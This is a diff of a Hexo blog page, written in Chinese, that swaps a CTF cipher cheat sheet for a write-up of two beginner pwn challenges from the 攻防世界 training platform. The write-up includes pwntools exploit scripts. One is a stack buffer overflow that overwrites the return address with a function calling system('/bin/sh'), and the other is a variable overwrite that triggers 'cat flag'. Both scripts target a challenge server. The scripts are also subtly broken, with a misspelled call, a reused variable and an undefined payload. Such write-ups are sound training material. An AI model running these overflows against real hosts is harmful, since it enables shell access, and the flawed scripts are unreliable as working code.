@@ -5,12 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>密码 - Hexo</title>
+    <title>攻防世界pwn wp - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="密码类型：1.md5 在线解密网站：https://cmd5.com/2.url：形式：%+ascii的16进制3.base64：形式：最后有=或==4.摩斯密码：形式：.和-4.凯撒密码5.变异凯,"> 
+    <meta name="description" content="新手区第一题level0反编译得到的重要的函数int callsystem(){  return system(“/bin/sh”);}和ssize_t vulnerable_function(){,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -38,7 +38,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">密码</h3>
+    <h3 class="subtitle">攻防世界pwn wp</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -53,14 +53,22 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title">密码</h1>
+        <h1 class="title">攻防世界pwn wp</h1>
         <div class="stuff">
-            <span>十二月 22, 2020</span>
+            <span>三月 04, 2021</span>
             
 
         </div>
         <div class="content markdown">
-            <p>密码类型：<br>1.md5 在线解密网站：<a target="_blank" rel="noopener" href="https://cmd5.com/">https://cmd5.com/</a><br>2.url：形式：%+ascii的16进制<br>3.base64：形式：最后有=或==<br>4.摩斯密码：形式：.和-<br>4.凯撒密码<br>5.变异凯撒<br>6.rot系列<br>7.维多利亚密码<br>8.佛语 形式：佛文 hint：在最前面加佛曰<br>9.Quoted-printable：形式：=+16进制=+16进制···<br>10.ascii编码<br>11.unicode：形式：<br>                a.&amp;#x [Hex]: &#x0054;&#x0068;&#x0065;<br>                b.&amp;# [Decimal]: &#00084;&#00104;&#00101;<br>                c.\U [Hex]: \U0054\U0068\U0065<br>                d.\U+ [Hex]: \U+0054\U+0068\U+0065<br>                网站：<a target="_blank" rel="noopener" href="https://www.css-js.com/tools/unicode.html">https://www.css-js.com/tools/unicode.html</a><br>12.栅栏密码(w型)<br>13.ook语言 形式：ook··· 解密网站：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>14.brainfuck:形式:+[&lt;&gt;.] 解密网站：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>15.escape:如flag%7Bi-will-kill-you%21%7D<br>16.核心价值观编码<br>17.当铺密码形式：形式：羊由大井夫大人王中工<br>18.词频分析<br>19.jsfuck：形式：(![])+<br>20.rabbit<br>21.rsa 一般会给出p,q,e 解d<br>        脚本：<br>                <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#@Author:醉清风</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)       <span class="comment">#φ(n)在写的时候多用phi代替，因为键盘不好敲出来。</span></span><br><span class="line">d = gmpy2.invert(e,phi) <span class="comment">#e模phi的逆为d, (e*d)%phi==1 原理上面讲过</span></span><br><span class="line"><span class="built_in">print</span> (d)</span><br></pre></td></tr></table></figure><br>22.随机密码替换，网站：quipqiup<br>在线sage网站：<a target="_blank" rel="noopener" href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a><br>rsa介绍网站：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/76006823">https://zhuanlan.zhihu.com/p/76006823</a></p>
+            <p>新手区第一题level0<br>反编译得到的重要的函数<br>int callsystem()<br>{<br>  return system(“/bin/sh”);<br>}<br>和<br>ssize_t vulnerable_function()<br>{<br>  char buf; // [rsp+0h] [rbp-80h]</p>
+<p>  return read(0, &amp;buf, 0x200uLL);<br>}<br>buf占的空间为0x88<br>后面为<br>-0000000000000004                 db ? ; undefined<br>-0000000000000003                 db ? ; undefined<br>-0000000000000002                 db ? ; undefined<br>-0000000000000001                 db ? ; undefined<br>+0000000000000000  s              db 8 dup(?)<br>+0000000000000008  r              db 8 dup(?)<br>r存放的是返回地址<br>将r覆盖为callsystem即能进入system(“bin/sh”)<br>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">34767</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x400596</span>)//sysaddr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>] <span class="comment"># 获取 ELF 文件中 callsystem 的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.ineractive()</span><br></pre></td></tr></table></figure>
+
+<p>新手区第8题hello pwn<br>反编译代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(<span class="string">&quot;~~ welcome to ctf ~~     &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;lets get helloworld for bof&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60106C == <span class="number">0x6E756161</span> )</span><br><span class="line">    sub_400686(0LL, &amp;unk_601068);--cat flag</span><br><span class="line">  <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>dword_601068C的位置如图<br><img src="D:\攻防世界\hello_pwn.png" alt="avatar"><br>得到flag必须是dword值为0x6E756161，payload=b’a’*4+p32(0x6E756161)<br>exp为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;111.200.241.244:36548&quot;</span>,<span class="number">36548</span>)</span><br><span class="line">p=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x6E756161</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
+
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
